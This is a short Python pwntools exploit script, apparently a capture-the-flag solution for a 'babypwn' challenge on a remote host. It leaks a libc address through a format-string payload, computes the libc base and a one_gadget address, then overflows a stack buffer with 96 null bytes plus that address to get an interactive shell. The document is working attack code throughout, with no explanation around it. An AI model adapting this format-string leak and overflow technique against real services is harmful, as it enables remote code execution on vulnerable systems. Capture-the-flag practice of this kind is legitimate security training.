from pwn import *

libc = ELF("./libc.so.6")
r = remote("be.ax" ,31801)
#r = process("./babypwn")
r.sendlineafter('What is your name?\n', b"%87$p")
r.recvuntil(b"Hi, ")
libc_leak = str(r.recvuntil(b"\n"))
libc_leak = libc_leak[2:len(libc_leak)-3]
libc_leak = int(libc_leak,16)
libc_base = libc_leak - 0x24083
one_gadget = libc_base + 0xe3afe
log.info(f"[LEAK] libc_start_main+243: {hex(libc_leak)}")
log.info(f"[LEAK] libc base: {hex(libc_base)}")
log.info(f"[LEAK] one_gadget: {hex(one_gadget)}")
exploit = b"\x00" * 96 + p64(one_gadget)
r.sendlineafter("frog: emote?\n" ,exploit)
r.interactive()
